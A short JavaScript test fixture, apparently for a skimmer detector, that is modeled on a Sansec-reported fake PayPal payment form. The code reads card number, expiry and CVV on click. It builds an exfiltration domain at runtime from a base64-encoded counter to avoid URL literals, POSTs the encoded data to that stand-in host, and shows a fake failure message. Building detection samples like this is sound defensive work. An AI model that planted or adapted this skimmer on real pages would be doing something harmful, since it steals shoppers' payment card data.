// expect: skimmer-field-harvest
// Modeled on Sansec, "Fake payment page before checkout" (2020): a fake PayPal-style form, and an exfil
// domain built at runtime by base64-encoding a counter (no URL literal to find).
var cnt = 7;
document.getElementById('pp_pay').addEventListener('click', function () {
  var d = { card: document.getElementById('pp_card_number').value, exp: document.getElementById('pp_exp').value, cvv: document.getElementById('pp_cvv').value };
  var dom = 'https://' + btoa(String(cnt)).replace(/=/g, '').toLowerCase() + '.example/';
  var x = new XMLHttpRequest(); x.open('POST', dom); x.send(btoa(JSON.stringify(d)));
  alert('Sorry, Paypal Checkout failed processing your order');
});
